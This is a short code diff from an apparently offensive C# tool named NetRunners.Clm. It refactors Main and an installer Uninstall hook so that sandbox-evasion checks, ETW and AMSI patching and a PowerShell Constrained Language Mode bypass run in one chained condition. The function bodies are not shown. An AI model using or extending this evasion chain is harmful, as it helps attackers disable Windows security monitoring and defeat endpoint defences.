@@ -16,13 +16,9 @@ namespace NetRunners.Clm
         static void Main(string[] args)
         {
             // call heuristic functions
-            if ((!Sleep()) || (!NonEmulated()))
-            {
+            if ((!Sleep()) || (!NonEmulated()) || (!PatchEtw()) || (!PatchAmsi()))
                 return;
-            }
-            // call patchers
-            if ((!PatchEtw()) || (!PatchAmsi()))
-                return;
+            
             BypassClm();
         }
     }
@@ -35,13 +31,9 @@ namespace NetRunners.Clm
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
             // call heuristic functions
-            if ((!Sleep()) || (!NonEmulated()))
-            {
+            if ((!Sleep()) || (!NonEmulated()) || (!PatchEtw()) || (!PatchAmsi()))
                 return;
-            }
-            // call patchers
-            if ((!PatchEtw()) || (!PatchAmsi()))
-                return;
+
             BypassClm();
         }
     }
